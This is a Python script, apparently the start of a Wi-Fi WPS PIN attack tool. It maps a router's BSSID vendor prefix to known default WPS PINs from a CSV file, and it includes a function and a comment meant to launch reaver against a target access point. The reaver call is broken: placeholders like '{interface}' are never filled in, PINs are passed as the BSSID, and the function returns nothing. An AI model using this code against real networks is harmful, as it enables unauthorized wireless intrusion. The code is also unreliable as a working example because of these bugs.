import subprocess

def normalize_bssid(bssid):
    """统一格式化 BSSID 并提取 OUI 部分"""
    return ':'.join(bssid.upper().split(':')[:3])  # 如 'F0:2F:74:C5:42:CC' → 'F0:2F:74'

def load_pin_database(csv_file='pins.csv'):
    """加载 CSV 数据为 OUI -> PIN 字典"""
    import pandas as pd
    pin_db = {}
    try:
        df = pd.read_csv(csv_file, encoding='utf-8')
        print(f"Loaded {len(df)} records from CSV")
        #print(f"{df}")

    except Exception as e:
        print(f"Error loading CSV: {e}")
    #return pin_db
    return df

# 假设你从扫描中得到了这个 MAC 地址
test_bssids = [
        "f0:2f:74:c5:42:cc",  # 应该匹配到 12345670
        "5C:35:3B:00:00:00",  # 应该匹配到 73927263
        "00:00:00:00:00:00"   # 无匹配
    ]

def find_pin(bssid, pin_db):
    df = pin_db
    oui = normalize_bssid(bssid)
    #print(f"\nTesting BSSID: {bssid} → OUI: {oui}")
    pins = []
    matches = df[df['OUI'] == oui]
    if not matches.empty:
        for index, match in matches.iterrows():
            pins.append(match['PIN'])
            print(f"→ PIN: {match['PIN']}")
    else:
        print("No matching PIN found.")
    return pins

def cf_pins(pins, interface):
    try:
        # reaver -i wlan0mon -b E0:3F:49:6A:57:78 -v
        result = subprocess.run(
            ["reaver", "-i", "{interface}", "-b", "{pins}", "-v"],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            print("Error: Unable to scan networks. Make sure Wi-Fi is enabled.")
            return []

        output = result.stdout
        return 
    except Exception as e:
        print(f"Error: {e}")
    return 

if __name__ == "__main__":
    df = load_pin_database()
    # print("All entries:")
    # print(df[['OUI', 'PIN']])  

    test_bssid = "5C:35:3B:00:00:00"
    test_oui = normalize_bssid(test_bssid)
    print(f"\nTesting BSSID: {test_bssid} → OUI: {test_oui}")

    matches = df[df['OUI'] == test_oui]
    if not matches.empty:
        for index, match in matches.iterrows():
            print("\n")
            
            print(f"Matched OUI: {match['OUI']} → PIN: {match['PIN']}")
    else:
        print("No matching PIN found.")
